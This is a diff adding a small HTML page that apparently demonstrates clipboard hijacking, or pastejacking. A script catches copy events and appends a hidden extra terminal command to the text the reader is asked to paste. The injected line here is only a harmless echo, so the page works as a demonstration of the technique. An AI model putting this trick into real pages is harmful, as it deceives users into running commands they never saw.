@@ -1,0 +1,24 @@
+<html>
+<style>
+pre {
+  background-color: #ddd;
+  padding: 10px;
+}
+</style>
+<h2>Paste the following in your terminal to continue</h2>
+<pre>
+echo "I am some harmless code :^)"
+</pre>
+<script>
+// l33t hacker code
+document.addEventListener('copy', event => {
+  if (event.clipboardData) {
+    event.preventDefault();
+    const copy =  window.getSelection() + '\necho "Haha I was evil all along"\n';
+    event.clipboardData.setData('Text', copy);
+  } else {
+    console.log('Bo :(')
+  }
+});
+</script>
+</html>
